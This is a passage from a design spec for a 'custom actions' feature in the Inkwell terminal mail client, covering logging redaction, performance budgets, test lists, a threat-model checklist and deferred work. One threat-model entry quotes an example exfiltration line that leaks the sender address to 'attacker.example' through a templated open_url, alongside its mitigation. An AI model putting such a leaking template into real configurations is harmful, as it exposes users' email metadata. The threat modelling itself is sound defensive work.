  `custom_action_resolve_failed name=<name> step=<i> op=<op>
  reason=<short string>`. `<short string>` does not interpolate
  template values — the resolved string is in the toast for the
  user, not in the log.
- One INFO line per invocation that completes:
  `custom_action_done name=<name> ok=<n> failed=<n>
  skipped=<n>`.

The `prompt_value` modal does NOT log the user's typed string at
any level. The prompt template's resolved form (which may contain
`From`) is rendered ONLY to the visible modal header; it is never
logged. **It is, however, on the visible terminal surface** — the
modal header is part of the terminal's frame buffer, will appear
in tmux scrollback, terminal recordings, and screenshares.
Operators should treat the modal header as PII-bearing visible
output; it is no different in this respect from the viewer pane
showing a raw `From:` line. Test fixtures stay redacted: the e2e
golden frames committed to `internal/ui/testdata/` /
`internal/customaction/testdata/` use the synthetic domain
`example.invalid` (CLAUDE.md §7.4).

A new redaction test (`internal/customaction/customaction_test.go
TestCustomActionLogsRedactPII`) asserts that running every op in
the catalogue against a fixture message produces no log line
containing `alice@news.example`, the subject `URGENT MEETING`,
or the message ID `m-2026-test-001`.

## 8. Performance

Budgets:

| Surface | Budget | Notes |
|---------|--------|-------|
| Catalogue load (50 actions, 200 steps total, average sequence length 4) | <30ms p95 | TOML decode + per-step template + pattern compile. Cold path; once at startup. |
| Catalogue load at the §3.1 hard cap (256 actions × 32 steps = 8192 steps) | <500ms p95 | Worst-case bound. Startup-only; under the cold-start budget (PRD §7 — <500ms cold-to-interactive) when the user actually authors near the cap, the rest of startup squeezes. Documented; the 256-action cap is documented in `docs/user/reference.md` as the practical upper bound. |
| Resolve phase (one action, ≤32 steps) against an in-memory `Context` | <2ms p95 | Pure CPU + folder map lookup. |
| Dispatch phase (one action, 4 non-bulk steps, locally optimistic + 4 enqueues) | <20ms p95 | Dominated by 4× `EnqueueAction` SQLite writes (each ≤ 5ms p95 per spec 02 §6). |
| Per-keystroke `customKeys` scan (≤ 64 entries) | <0.5ms p95 | Linear scan on each Normal-mode keystroke; well under the spec 04 frame budget. |
| `inkwell action validate` end-to-end (load + render) | <100ms p95 | Same path as startup load + a stdout dump. Bench gates the recipe-iteration loop the deferred `:actions reload` would have addressed. |

Benches in `internal/customaction/bench_test.go`:

- `BenchmarkLoadCatalogue50Actions` — generates a 50-action,
  200-step catalogue via `testfixtures.go`; loads it through
  `LoadCatalogue`. ≤ 45ms p95 (50% headroom rule, CLAUDE.md §6).
- `BenchmarkLoadCatalogueAtCap` — 256 actions × 32 steps =
  8192 steps. Asserts <750ms p95 (50% headroom on the 500ms
  worst-case budget). Bounds the cap; if the bench fails the
  cap drops to the largest tractable value.
- `BenchmarkResolveAction` — resolves a 4-step action against
  a synthetic `Context`. ≤ 3ms p95.
- `BenchmarkDispatchAction` — dispatches a 4-step action against
  a tmpdir SQLite store with stubbed Graph. ≤ 30ms p95.

The benches use synthesised fixtures (CLAUDE.md §5.2 — no
binary blobs). The `dispatchAction` bench shares the
`internal/store/bench_test.go` SQLite-tmpdir harness via a
test-only helper.

## 9. Definition of done

- [ ] **Package**: `internal/customaction/` with `types.go`,
      `loader.go`, `executor.go`, `ops.go`, `context.go`,
      `customaction_test.go`, `bench_test.go`, `testfixtures.go`.
- [ ] **Types**: `Action`, `Step`, `Catalogue`, `Scope`,
      `ConfirmPolicy`, `Context`, `ExecDeps`, `Triage`, `Bulk`,
      `Thread`, `Muter`, `RoutingWriter`, `Unsubscriber`,
      `UnsubAction`, `FolderResolver`, `opSpec` per §3.2 /
      §4.2 / §4.5.
- [ ] **Loader**: `LoadCatalogue(ctx, path, deps) (*Catalogue,
      error)` per §3.3 + §3.7 validation pipeline.
- [ ] **Executor**: `Run(ctx, action, msg) (Result, error)` per §4.4.
- [ ] **Op catalogue**: 22 ops registered (§3.5) as a package-
      level `var ops = map[OpKind]opSpec{...}` literal — no
      `init()`. Deferred ops (`block_sender`, `shell`, `forward`)
      rejected at load with the deferred-ops message (§3.6).
- [ ] **Folder resolver wiring**: `cmd_run.go` constructs an
      `customaction.FolderResolver` that wraps the existing
      `cmd/inkwell/cmd_folder.go resolveFolderByNameCtx` (already
      used by spec 14 / spec 18 CLI). Both the new
      `inkwell action run` subcommand and the custom-action TUI
      dispatcher consume the same resolver. No refactor of the
      TUI's interactive move-picker; the two paths are
      independent.
- [ ] **Templating**: Go `text/template` against `Context` per
      §4.2; roadmap-syntax aliases rewritten with deprecation
      slog warning per §4.2.
- [ ] **Folder-template guard**: `allow_folder_template` opt-in
      flag enforced at load time per §4.3.
- [ ] **Confirm rules** (§3.4): `auto`/`always`/`never`; auto
      triggers on destructive op, `[bulk].confirm_threshold`
      breach, or `*_filtered` step.
- [ ] **Stop-on-error** (§2.4): default `true` for destructive
      sequences, `false` otherwise; per-step override honoured.
- [ ] **KeyMap wiring**: `customKeys map[string]key.Binding` on
      `Model`; dispatcher loop in `updateNormal` /
      `updateMessageList` / `updateMessageViewer`; new
      `findDuplicateBindingWith(km, custom)` helper added in
      `internal/ui/keys.go`; call ordering in `cmd_run.go` is
      step 1–6 of §4.6.
- [ ] **Single-key only**: chord-style `key` strings (`<C-x> n`,
      whitespace) rejected at load. Documented in user reference.
- [ ] **Mode**: `CustomActionPromptMode` constant added to
      `internal/ui/messages.go`; modal renders via existing
      single-line input modal style.
- [ ] **Continuation**: `m.customActionContinuation` field; resume
      after `prompt_value` modal returns; cancel on Esc.
- [ ] **Palette**: new "Custom actions" section in
      `internal/ui/palette_commands.go`; one row per action;
      availability gates per §4.8.
- [ ] **Help overlay**: "Custom actions" group appended in
      `buildHelpSections`; omitted when catalogue is empty.
- [ ] **`:actions` cmd-bar verb**: `list`, `show <name>`,
      `run <name>` per §4.10. `:actions` alone aliases
      `:actions list`. **No `reload` subcommand in v1.1**
      (CLAUDE.md §9 forbids hot reload).
- [ ] **CLI**: `cmd/inkwell/cmd_action.go` registers `action list`,
      `action show`, `action run`, `action validate` per §4.11.
      Exit codes per §4.11.
- [ ] **Logs**: per §7. Redaction test asserts no PII leaks.
- [ ] **Tests** (CLAUDE.md §5):
  - [ ] **Unit** (`internal/customaction/`):
        - `TestLoadCatalogueEmpty` — missing file → empty
          catalogue, no error.
        - `TestLoadCatalogueValidatesOpName` — unknown op → error
          with file:line.
        - `TestLoadCatalogueRejectsDeferredOp` — `op = "shell"` → 
          deferred-ops error message.
        - `TestLoadCatalogueRequiresParams` — `move` without
          `destination` → error.
        - `TestLoadCatalogueValidatesPattern` — `filter` step
          with bad pattern → error pointing at the pattern.
        - `TestLoadCatalogueValidatesTemplate` — bad
          `{{.NotAField}}` → error.
        - `TestLoadCatalogueRoadmapAliasRewrite` — `{sender}` in
          a template rewrites to `{{.From}}` and emits a slog
          warning.
        - `TestLoadCatalogueRejectsPermDeleteWithConfirmNever`.
        - `TestLoadCatalogueRejectsDuplicateName`.
        - `TestLoadCatalogueRejectsDuplicateKey`.
        - `TestLoadCatalogueRejectsKeyCollidingWithDefault` —
          custom action `key = "a"` (Archive default) → error
          unless `[bindings].archive` was overridden.
        - `TestLoadCatalogueAcceptsKeyAfterRebindingDefault` —
          if `[bindings].archive = "x"`, `key = "a"` is accepted.
        - `TestLoadCatalogueRejectsExtraTomlFields` — typo'd
          `seqeunce =` → error.
        - `TestLoadCatalogueAcceptsAllowFolderTemplateOptIn` —
          `move.destination = "{{.SenderDomain}}"` rejected
          unless `allow_folder_template = true`.
        - `TestLoadCatalogueAcceptsAllowURLTemplateOptIn` —
          `open_url.url = "https://x.example/?q={{.From}}"`
          rejected unless `allow_url_template = true`.
        - `TestLoadCatalogueRejectsChordKey` — `key = "<C-x> n"`
          → load error.
        - `TestLoadCatalogueRejectsAddCategoryReplyLater` —
          literal `category = "Inkwell/ReplyLater"` →
          load error redirecting to `thread_add_category`.
        - `TestLoadCatalogueAllowsTemplatedCategoryReservedName` —
          `category = "{{.Subject}}"` accepted (we can't know
          at load time what it renders to).
        - `TestLoadCatalogueComputesRequiresMessageContext` —
          per-step + per-action bit reflects template AST.
        - `TestLoadCatalogueParsesStepLevelStopOnError` —
          step's `stop_on_error = false` overrides action default.
        - `TestResolveContextPopulatesAllVariables`.
        - `TestResolveAbortsBeforeEnqueueOnTemplateError`.
        - `TestResolveAbortsBeforeEnqueueOnFolderNotFound`.
        - `TestStopOnErrorTrueShortCircuits`.
        - `TestStopOnErrorFalseContinues`.
        - `TestPromptValueBindsUserInput`.
        - `TestPromptValueCancelStopsSequence`.
        - `TestSecondPromptValueOverwritesUserInput`.
        - `TestUndoReversesEachQueuedStepIndependently` —
          5-step action with 5 queue-routed steps; 5× `u`
          reverses in reverse order; undo toast names primitive,
          not custom action.
        - `TestUndoSkipsNonReversibleSteps` — 3-step action
          (`mark_read`, `set_sender_routing`, `archive`); single
          `u` reverses `archive` only; second `u` reverses
          `mark_read`; routing change persists across both. Toast
          on the original action invocation flagged
          `set_sender_routing` as `[non-undoable]`.
        - `TestSetThreadMutedNotUndoable` — same shape for
          `set_thread_muted`.
        - `TestPostPromptResolveFailureKeepsPriorBatch` — 4-step
          action: step 1 `mark_read`, step 2 `prompt_value`,
          step 3 `move {{.UserInput}}` (folder doesn't exist);
          assert step 1 enqueued (1 row in `actions`), step 3
          reports failure, toast multi-line per §5.2.
        - `TestResultToastMarksNonUndoableSteps` — 3-step
          fixture: `mark_read`, `set_sender_routing`, `archive`.
          Assert toast row 2 carries the `[non-undoable]`
          marker; rows 1 and 3 do not. Mirror test for
          `set_thread_muted`.
        - `TestConfirmAutoPromptsOnDestructive`.
        - `TestConfirmAutoPromptsOverThreshold`.
        - `TestConfirmAutoSilentOnSafeSequence`.
        - `TestConfirmAlwaysPrompts`.
        - `TestConfirmNeverDispatchesImmediately` —
          non-destructive action only.
        - For each registered op (§3.5, 22 ops): one happy-path
          test that the dispatch closure invokes the right
          executor method with the templated params. Including:
          - `TestFlagOpReadsCurrentStateAndSetsFlagged` —
            unflagged message + `flag` op → `ToggleFlag` called
            with `currentlyFlagged=false`. Already-flagged →
            `ToggleFlag` is NOT called; toast row marked `–`.
          - `TestUnflagOpReadsCurrentStateAndUnsetsFlagged` —
            mirror.
          - `TestUnsubscribeOpResolvesThenPostsForOneClick` —
            `Unsubscribe.Resolve` returns `Method=POST`; the op
            calls `OneClickPOST`.
          - `TestUnsubscribeOpFallsBackToOpenURLForMailto` —
            `Method=URL`; the op calls `OpenURL`.
          - `TestSetThreadMutedTrueCallsMuteConversation`.
          - `TestSetThreadMutedFalseCallsUnmuteConversation`.
        - `TestSetSenderRoutingDestinationStaticEnumOnly` — load
          rejects templated destination (`{{.From}}`).
        - `TestPermanentDeleteFilteredAlwaysConfirms`.
        - `TestFilterFollowedByNonFilteredEmitsLoadWarning`.
        - `TestEmptyFromAbortsRoutingStep`.
        - `TestEmptyConversationIDAbortsThreadStep`.
  - [ ] **Integration** (`integration_test.go`):
        - `TestCustomActionEnqueuesNActions` — 4-step action with
          4 queue-routed ops, assert 4 rows in `actions` table
          after dispatch.
        - `TestCustomActionRollbackOnResolveFailure` — bad
          template in batch 0 → 0 rows in `actions`.
        - `TestCustomActionSetSenderRoutingNotEnqueued` —
          single `set_sender_routing` step, assert 0 rows in
          `actions` table but `sender_routing` row written.
        - `TestCustomActionPartialSuccessLeavesNQueued` — step 3
          fails at dispatch, `stop_on_error = true`, assert 2
          rows in `actions` (steps 1 + 2).
        - `TestCustomActionPartialSuccessContinues` — step 3
          fails, `stop_on_error = false`, assert 4 rows.
        - `TestCLIValidateExitsZeroOnGoodFile`.
        - `TestCLIValidateExitsNonzeroOnBadFile`.
        - `TestCLIRunFilterRejectsPerMessageTemplate` — invoke
          `inkwell action run X --filter "~f a@b.invalid"` against
          an action whose step references `{{.From}}`; exit 1.
        - `TestCLIRunMessageContextPopulated` — `--message <id>`
          + an action that templates `{{.Subject}}` resolves
          correctly.
  - [ ] **TUI e2e** (`internal/ui/app_e2e_test.go`):
        - `TestCustomActionKeyDispatches` — fixture catalogue
          binds `n` to a `mark_read + archive` action; press
          `n`; visible delta: focused row's unread glyph
          disappears AND the row is gone from the list (archived).
        - `TestCustomActionPromptValueOpensModal` — action with
          `prompt_value`; press the binding; modal frame appears
          with the rendered prompt.
        - `TestCustomActionPromptValueEscCancelsSequence` —
          `Esc` in the modal; status bar shows "cancelled at
          step <i>"; subsequent steps did not run.
        - `TestCustomActionConfirmModalShowsResolvedSequence` —
          `confirm = "always"` action; modal body contains the
          resolved sender address (from-address dummy fixture
          uses `dummy@example.invalid`).
        - `TestCustomActionPaletteRowDispatches` — open palette
          with `Ctrl+K`, type the action name, press Enter;
          same visible delta as the key dispatch.
        - `TestCustomActionHelpOverlayShowsRow` — `?` overlay
          contains the action's name + description.
        - `TestActionsListShowsAllActions` — `:actions` →
          status overlay lists each name.
        - `TestActionsShowRendersResolvedSequence` —
          `:actions show <name>` → overlay shows numbered steps.
        - `TestUndoAfterCustomActionReversesLastQueuedStep` —
          run a 3-step action where the last step is queue-routed,
          press `u`, the last step's undo path fires (not the
          whole sequence).
        - `TestActionsShowResolvedWithFocusedMessage` —
          `:actions show <name>` with a focused message renders
          the resolved templates.
        - `TestActionsShowLiteralWithoutFocusedMessage` —
          same command from the folders pane (no focused
          message) renders literal templates.
  - [ ] **Redaction** (`customaction_test.go`):
        - `TestCustomActionLogsRedactPII` — every op in the
          catalogue against a fixture message; assert no log
          line at any level contains `From` / `Subject` /
          `MessageID`.
        - `TestPromptValueDoesNotLogUserInput` —
          `prompt_value` capture is never emitted to slog.
  - [ ] **Bench** (`internal/customaction/bench_test.go`):
        - `BenchmarkLoadCatalogue50Actions` — ≤ 45ms p95.
        - `BenchmarkResolveAction` — ≤ 3ms p95.
        - `BenchmarkDispatchAction` — ≤ 30ms p95.
        - `BenchmarkCustomKeysScan64` — ≤ 0.5ms p95 per
          keystroke against a 64-entry `customKeys` map.
- [ ] **Config**: `[custom_actions].file` row added to
      `docs/CONFIG.md` with the default path. The
      `[bulk].confirm_threshold` row already exists; reference it
      from the new section's prose.
- [ ] **User docs**:
  - [ ] `docs/user/reference.md`: new "Custom actions" section
        listing the 22 ops, the templating variables, the
        `confirm` / `stop_on_error` / `when` / `key` /
        `allow_folder_template` / `allow_url_template` keys,
        the single-key-only restriction on `key`, the
        `:actions` verbs (no `reload`), the `inkwell action ...`
        CLI subcommands. Update the
        `_Last reviewed against vX.Y.Z._` footer.
  - [ ] `docs/user/how-to.md`: three recipes — "Triage a
        newsletter in one keypress" (mark_read + set_sender_routing
        + archive), "Move all from this sender to a folder I'll
        name" (prompt_value + move_filtered), "Stash to Reply
        Later via the keyboard" (thread_add_category against
        `Inkwell/ReplyLater`). Each recipe shows the TOML
        verbatim and explains the confirm gate.
  - [ ] `docs/user/explanation.md`: one paragraph on why custom
        actions are invocation-driven (not on-new-message
        triggered) — mirrors §5.5.
  - [ ] `docs/user/tutorial.md`: skipped. The first-30-minutes
        path is unchanged; custom actions are an advanced feature
        the new user reaches via the how-to recipes.
- [ ] **Project docs** (must land in the same commit that ships
      the feature, per CLAUDE.md §13):
  - [ ] `docs/PRD.md` §10: row for spec 27 added under post-v1 /
        ROADMAP §0 bucket 3.
  - [ ] `docs/ROADMAP.md`: §0 Bucket 3 row 1 (Custom actions
        framework) → status `Shipped vX.Y.Z (spec 27)`. §2 backlog
        heading → `— Shipped vX.Y.Z (spec 27)`. The §2.x prose
        gains an "Owner: spec 27" line at the top.
  - [ ] `docs/specs/27-custom-actions.md`: `**Shipped:** vX.Y.Z`
        line added at the top.
  - [ ] `docs/plans/spec-27.md` exists from spec start, updated
        each iteration (CLAUDE.md §13 mandatory tracking note).
  - [ ] `README.md` Status table: row for "Custom actions
        framework" with `✅ vX.Y.Z`. Download example version
        bumped if this is the latest release.
- [ ] All five mandatory commands (CLAUDE.md §5.6) green:
      `gofmt -s`, `go vet`, `go test -race`,
      `go test -tags=integration`, `go test -tags=e2e`,
      `go test -bench=. -benchmem -run=^$`. The full
      `make regress` is run before tag (CLAUDE.md §5.7).

## 10. Cross-cutting checklist

- [ ] **Scopes**: none new. Every op delegates to a verb
      already covered by `Mail.ReadWrite` (PRD §3.1). Deferred
      ops `block_sender` / `shell` / `forward` are documented
      as needing future-spec scope review.
- [ ] **Store reads/writes**: no schema change. Reads
      `messages` / `folders` for the resolve phase
      (folder-name resolution, conversation ID lookup); writes
      flow through the existing `EnqueueAction` path. No new
      table, no new column, no migration.
- [ ] **Graph endpoints**: none new. Each step uses its source
      spec's existing endpoint (PATCH for read/flag/category,
      POST `/move`, DELETE for soft/perm delete, etc.). No new
      `/messageRules`, no `/applicableHotkeys`, no inference
      override — all deferred (§3.6 / §5.5).
- [ ] **Offline**: full offline. Resolve phase does not call
      Graph; dispatch phase enqueues to the action queue which
      drains on next sync. CLI `inkwell action run` exits 0
      offline because resolve + enqueue both succeed; the
      Graph reconciliation happens on next sync.
- [ ] **Undo**: per-step (§5.4). Each queue-routed op pushes its
      own undo record exactly as if the user had pressed the
      single key. `u` reverses the last queued step.
      `set_sender_routing` and `set_thread_muted` are
      synchronous direct writes and **not** reversible by `u`;
      the result toast surfaces this with a `[non-undoable]`
      marker (§5.2).
- [ ] **Error states**: §6 edge cases table is exhaustive.
      Resolve-time errors → zero side effects + status toast.
      Dispatch-time errors → multi-line toast (§5.2). CLI exit
      codes per §4.11.
- [ ] **Latency**: §8 budgets benched.
- [ ] **Logs**: §7. INFO lines on run start / end; WARN on
      resolve failure. No PII. New redaction test
      (`TestCustomActionLogsRedactPII`).
- [ ] **CLI**: `inkwell action {list,show,run,validate}` per
      §4.11.
- [ ] **Tests**: §9 layer list (unit + integration + e2e +
      redaction + bench).
- [ ] **Spec 17 review**: this PR adds (a) a new file I/O path
      (read `actions.toml`); (b) a new templating surface; (c) a
      new dispatch fan-out across existing ops. It does NOT add
      token handling, subprocess, external HTTP, cryptography,
      or new SQL composition. The `actions.toml` read uses
      `os.Open` against a config-resolved path — same shape as
      `saved_searches.toml` (spec 11). The path-traversal guard
      in `internal/secfs` is irrelevant (the file is not
      user-supplied content; the user explicitly named its
      path). The templating layer's threat surface is bounded
      by Go `text/template`'s default `FuncMap` (no
      `template.FuncMap` extension; no `os` / `exec` access).
      Add to `docs/THREAT_MODEL.md`:
      - **T-CA1**: Templated folder destination produces
        unintended folder via `{{.From}}` injection.
        *Mitigation:* `allow_folder_template = true` opt-in
        (§4.3).
      - **T-CA2**: `prompt_value` user input reflected into a
        subsequent template as code.
        *Mitigation:* `UserInput` is bound verbatim into the
        Context and never re-templated (§4.3).
      - **T-CA3**: Community-shared `actions.toml` exfiltrates
        PII via `open_url = "https://attacker.example/?leak={{.From}}"`.
        *Mitigation:* `allow_url_template = true` opt-in
        required when an `open_url` URL templates message data
        (§4.3 / review #14).
      - **T-CA4**: Custom action contains `permanent_delete*`
        with `confirm = "never"`.
        *Mitigation:* load-time error (§3.4 / §3.7).
      Add to `docs/PRIVACY.md`: "Custom actions read
      `~/.config/inkwell/actions.toml` at startup. Actions may
      reference message metadata (sender address, subject) at
      run time via templates; rendered values stay on-device
      unless an action explicitly opts in to URL templating
      with `allow_url_template = true`. The visible
      `prompt_value` modal header may render PII as part of the
      terminal frame — operators recording sessions should be
      aware (§7)." No `// #nosec` annotation expected; no new
      security CI gate.
- [ ] **Spec 04 consistency**: new mode `CustomActionPromptMode`
      added; mode dispatch in the root switch; pane-scoped
      meaning preserved (custom actions dispatch from list /
      viewer / folders per `when`); `KeyMap` is unchanged
      (custom-action keys live on a separate `customKeys` map);
      `findDuplicateBinding` extended to include custom actions.
- [ ] **Spec 07 consistency**: each step delegates to the
      single-message executor (`Triage`) or bulk executor
      (`Bulk`) for `*_filtered` ops. The action queue's
      optimistic-write semantics hold per step. The undo stack
      is unchanged.
- [ ] **Spec 08 / 10 consistency**: `filter` / `move_filtered` /
      `permanent_delete_filtered` patterns compile via
      `pattern.Compile` at load time; runtime dispatch uses
      the existing bulk path (`m.bulkPending = true` + bulk
      executor).
- [ ] **Spec 11 consistency**: `actions.toml` is co-resident
      with `saved_searches.toml`; the loader follows the same
      "missing-file is empty catalogue" / "invalid file is
      startup error" convention.
- [ ] **Spec 14 consistency**: `inkwell action {list, show,
      run, validate}` mirrors the existing CLI subcommand
      surface (`later`, `aside`, `route`, `bundle`, `rule`).
      Exit codes match the established convention (0 success,
      1 user error, 2 partial success, 3 confirm rejection).
- [ ] **Spec 16 consistency**: `unsubscribe` op delegates to
      `UnsubscribeService.RunForMessage`; nil-service path is
      the existing "not wired" toast. No new unsubscribe
      semantics.
- [ ] **Spec 17 consistency**: see review row above; threat
      model + privacy doc rows added.
- [ ] **Spec 19 consistency**: `set_thread_muted` op calls
      `store.MuteConversation` / `store.UnmuteConversation`
      directly (synchronous, not via the action queue — same
      path the `M` keypress uses today via spec 19's
      dispatch). Not undoable by `u` (acknowledged in §1.3 /
      §5.2 toast row). No new mute semantics.
- [ ] **Spec 20 consistency**: spec 27 does NOT generalise the
      chord-pending machinery (review #10). Spec 20's
      `threadChordPending` bool is unchanged. Custom-action
      bindings are single-key only in v1.1; chord support is
      explicitly deferred to a future spec (§12) that owns the
      `chordPending map[string]chordState` refactor. The
      `thread_archive` / `thread_add_category` /
      `thread_remove_category` ops in spec 27's catalogue are
      invocable via single-key custom actions or the palette,
      and their underlying call paths are unchanged.
- [ ] **Spec 22 consistency**: palette section "Custom actions"
      added; rows render with binding column; availability gates
      in §4.8 mirror the dispatcher's. Frecency / recents
      bookkeeping is unchanged. The `>` (commands-only) sigil
      includes custom actions alongside static commands (commands
      from the user's perspective). Spec 22's reference doc
      mentions the section list as "Commands | Folders | Saved
      searches"; this spec adds "Custom actions" to that list and
      updates `docs/user/reference.md` accordingly. No new sigil
      is introduced; users reach custom actions via the unscoped
      mixed search or the `>` commands sigil.
- [ ] **Spec 23 consistency**: `set_sender_routing` op uses
      `store.SetSenderRouting` directly (synchronous, not via
      action queue — same path the `S` chord uses). The static
      enum {imbox, feed, paper_trail, screener} is enforced at
      load time.
- [ ] **Spec 24 consistency**: tabs are query-driven views; a
      custom action invoked from a tab operates on the focused
      message in that tab's result set. No new tab-aware logic.
- [ ] **Spec 25 consistency**: `Inkwell/ReplyLater` and
      `Inkwell/SetAside` are valid `thread_add_category` /
      `thread_remove_category` arguments only — per-message
      `add_category` rejects them at load time with a redirect
      to the thread variant. Reason: spec 25 defines Reply Later
      and Set Aside as **thread-level** stacks; per-message
      categorisation produces partially-categorised
      conversations invisible to the stack listing (review
      #13).
- [ ] **Spec 26 consistency**: bundling is a render-pass
      concern; custom actions are dispatch concerns. They are
      orthogonal — invoking a custom action on a focused row
      that happens to be a bundle representative dispatches
      against the representative (same as the chord verbs in
      spec 20). To act on the entire bundle, the user composes
      a `filter` + `move_filtered` action with the pattern
      `~f {{.From}}`.
- [ ] **Doc sweep (§12.6)**: `docs/CONFIG.md` row for
      `[custom_actions].file`; `docs/user/reference.md`
      surfaces (op catalogue, template variables, `:actions`
      verbs, CLI subcommands, `CustomActionPromptMode` row in
      the Modes section if one exists, the new "Custom actions"
      palette section in the §22 palette description, the
      single-key-only restriction on `key`, the `allow_*_template`
      opt-in flags); `docs/user/how-to.md` recipes;
      `docs/user/explanation.md` paragraph; `docs/PRD.md` §10
      row; `docs/ROADMAP.md` bucket-3 row + §2 backlog heading;
      `README.md` status table row + version bump;
      `docs/specs/27-custom-actions.md` Shipped line;
      `docs/plans/spec-27.md` final iteration entry. The §12.6
      trigger list mechanical check confirms `internal/ui/keys.go`
      (no new fixed binding — the diff is `customKeys` map
      plumbing only + new `findDuplicateBindingWith` helper),
      `internal/ui/palette_commands.go` (new "Custom actions"
      section), `internal/ui/messages.go` (new
      `CustomActionPromptMode` constant),
      `cmd/inkwell/cmd_action.go` (new file with `list` /
      `show` / `run` / `validate` subcommands), and
      `internal/customaction/ops.go` (new op catalogue) all
      surface in `reference.md`.

---

## 11. Configuration changes

`docs/CONFIG.md` gains:

```toml
[custom_actions]
# Path to the TOML file declaring custom actions. Defaults to
# ~/.config/inkwell/actions.toml. Tilde and $HOME are expanded.
# Missing-file is treated as an empty catalogue (no error).
file = "~/.config/inkwell/actions.toml"
```

No new `[bindings]` rows — custom-action keys live in
`actions.toml` per action, not in `[bindings]`.

`actions.toml` itself is not part of `config.toml`'s schema; it is
a sibling file with its own validation pipeline (§3.7). Documenting
it lives in `docs/user/reference.md` (the canonical user-facing
surface) and `docs/user/how-to.md` (recipes), per CLAUDE.md §12.6.

## 12. Future work (post-spec-27)

The following items are explicitly **deferred** out of v1.1, with
the reason and the gating concern. Each is reversible by a follow-
up spec without breaking the v1.1 loaded-file format.

- **Chord-key bindings** (`<C-x> n`, etc.) — requires generalising
  spec 20's per-feature `threadChordPending` bool into a
  `chordPending map[string]chordState` and a real
  `PendingChordMode` constant. Out of scope here per the
  scope-discipline rule (CLAUDE.md §12.4). v1.1 accepts only
  single-key bindings (review #10).
- **`:actions reload` hot-reload** — CLAUDE.md §9 forbids hot
  reload. A future spec wanting it must land alongside a CLAUDE.md
  amendment explicitly granting the exception. v1.1 ergonomic
  concern is addressed by `inkwell action validate` + binary
  restart (§4.10 / review #6).
- **Pre-flight count in `*_filtered` confirm modal** — needs a
  new `BulkExecutor.Estimate(pat) → int` helper. The modal
  layout reserves the trailing slot; the upgrade is purely
  additive (§5.1 / review #5).
- **Grouped undo** (§5.4) — `undo_group` column + atomic
  rollback. Needs concrete user demand.
- **`block_sender` op** (§3.6) — server-side mailbox rule via
  `/messageRules`. Needs a CRUD UX for listing existing rules,
  collision detection on rule names, and a spec 17 review.
- **`shell` op** (§3.6) — sandboxed subprocess. Threat-model
  surface, env-var redaction, kill-switch, and a public stance
  on which subset of POSIX is exposed.
- **`forward` op** (§3.6) — create-forward-as-draft only (drafts,
  not send — PRD §3.1). Plausible after spec 15 follow-ups.
- **Conditional steps / control flow** — `if / else` blocks within
  a sequence. Defer until users hit cases the linear model can't
  express.
- **Inbound-rule hooks** — `on_new_message`, `folder_hook`. A
  separate spec; the CRUD surface is the right entry point, not
  the custom-actions catalogue.
- **Action sharing** — `~/.config/inkwell/actions/` directory of
  community recipes, downloadable via `inkwell action import
  <url>` with a vetting story. Plausible once a community of
  recipes forms; the `allow_url_template` and
  `allow_folder_template` guards are the v1.1 building blocks
  for any future trust prompt.
- **Multi-account binding** — `--account <id>` flag is wired
  for forward-compatibility per ROADMAP §1.2 but custom actions
  do not support per-account bindings in v1.1.
